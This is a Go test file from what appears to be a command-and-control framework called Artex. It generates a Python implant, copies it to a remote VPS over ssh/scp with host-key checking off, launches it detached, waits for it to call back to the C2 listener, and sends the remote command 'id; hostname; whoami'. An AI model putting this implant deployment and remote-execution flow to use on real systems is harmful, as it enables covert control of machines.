package c2

// 公网 TCP C2 真机 E2E（默认 skip）：真实 Manager + 公网映射端口 + 公网 VPS 上的
// Python 植入端，验证上线、加密信封任务下发与结果回传。
//
//	ARTEX_C2_TOKEN=... ARTEX_C2_PUBLIC_VPS_ADDR=39.89.211.55:39444 \
//	ARTEX_C2_VPS_SSH=root@113.20.3.124 ARTEX_C2_VPS_KEY=~/.ssh/id_ed25519_113.20.3.124 \
//	go test ./c2 -run TestTCPPublicVPS -v -timeout 180s

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

func TestTCPPublicVPS(t *testing.T) {
	token := strings.TrimSpace(os.Getenv("ARTEX_C2_TOKEN"))
	addr := strings.TrimSpace(os.Getenv("ARTEX_C2_PUBLIC_VPS_ADDR"))
	vps := strings.TrimSpace(os.Getenv("ARTEX_C2_VPS_SSH"))
	keyPath := strings.TrimSpace(os.Getenv("ARTEX_C2_VPS_KEY"))
	if token == "" || addr == "" || vps == "" || keyPath == "" {
		t.Skip("需要 ARTEX_C2_TOKEN / ARTEX_C2_PUBLIC_VPS_ADDR / ARTEX_C2_VPS_SSH / ARTEX_C2_VPS_KEY")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 160*time.Second)
	defer cancel()
	m := NewManager(token)
	defer m.StopAll()
	_, bound, err := m.Start(ctx, "0.0.0.0:39444")
	if err != nil {
		t.Fatalf("start: %v", err)
	}
	t.Logf("tcp c2 listener on %s", bound)
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatal(err)
	}
	id := "vps-tcp-manager-e2e"
	script := PythonImplant(addr, token, base64.StdEncoding.EncodeToString(key), id)
	local := "/tmp/c2_tcp_manager_implant.py"
	if err := os.WriteFile(local, []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	ssh := func(cmd string) (string, error) {
		c := exec.Command("ssh", "-i", keyPath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", vps, cmd)
		out, err := c.CombinedOutput()
		return string(out), err
	}
	scp := exec.Command("scp", "-i", keyPath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", local, vps+":/tmp/c2_tcp_manager_implant.py")
	if out, err := scp.CombinedOutput(); err != nil {
		t.Fatalf("scp: %v %s", err, out)
	}
	defer func() {
		_, _ = ssh("pkill -f c2_tcp_manager_implant 2>/dev/null; rm -f /tmp/c2_tcp_manager_implant.py /tmp/c2_tcp_manager_implant.log")
	}()
	if _, err := ssh("setsid -f python3 /tmp/c2_tcp_manager_implant.py >/tmp/c2_tcp_manager_implant.log 2>&1; echo STARTED"); err != nil {
		t.Fatalf("run implant: %v", err)
	}
	var info SessionInfo
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		if got, ok := m.Get(id); ok {
			info = got
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if info.ID == "" {
		logs, _ := ssh("tail -20 /tmp/c2_tcp_manager_implant.log 2>&1")
		t.Fatalf("implant not online; vps log=%s", logs)
	}
	t.Logf("tcp c2 session online id=%s remote=%s os=%s arch=%s user=%s", info.ID, info.Remote, info.OS, info.Arch, info.User)
	res, err := m.Dispatch(ctx, id, &Task{Kind: "exec", Args: "id; hostname; whoami"}, 15*time.Second)
	if err != nil {
		t.Fatalf("dispatch: %v", err)
	}
	if res.ExitCode != 0 || !strings.Contains(res.Output, "uid=") {
		t.Fatalf("exec result exit=%d output=%q err=%q", res.ExitCode, res.Output, res.Err)
	}
	t.Logf("tcp c2 exec ok output=%q", strings.TrimSpace(res.Output))
}
